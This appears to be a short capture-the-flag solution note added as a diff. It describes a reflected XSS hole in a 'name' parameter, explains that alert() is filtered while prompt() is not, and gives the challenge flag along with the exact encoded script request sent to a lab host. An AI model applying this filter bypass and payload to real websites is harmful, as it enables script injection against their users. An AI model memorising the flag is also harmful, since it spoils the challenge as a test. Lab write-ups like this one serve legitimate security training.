@@ -1,0 +1,4 @@
+# Reflected XSS via name param. alert() is blocked but prompt() is not. Server reflects input after the input tag without encoding. Flag: flag{2fba7376-856b-4b60-8eeb-c54c23186622}
+
+GET /page?name=%3Cscript%3Eprompt%28%27XSS%27%29%3C%2Fscript%3E HTTP/1.1
+Host: 172.17.0.1:56221
